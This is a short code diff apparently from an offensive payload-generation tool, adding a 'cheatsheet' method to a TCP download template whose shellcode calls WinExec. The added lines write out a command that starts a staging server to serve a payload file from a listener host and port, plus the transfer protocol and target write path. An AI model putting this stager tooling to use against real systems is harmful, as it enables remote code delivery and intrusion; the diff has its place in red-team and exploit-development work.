@@ -209,3 +209,11 @@ class TcpDownloadTemplate(PayloadTemplate):
             f"    call dword ptr {winexec}",
             "",
         ])
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Serve file for download",
+             f"python3 Tools/tcp_stage_server.py --lhost {config.lhost} --lport {config.lport} --payload <FILE_TO_SERVE>"),
+            ("Protocol", "[4 bytes LE size][raw file bytes]"),
+            ("File written to", config.dst_path),
+        ]
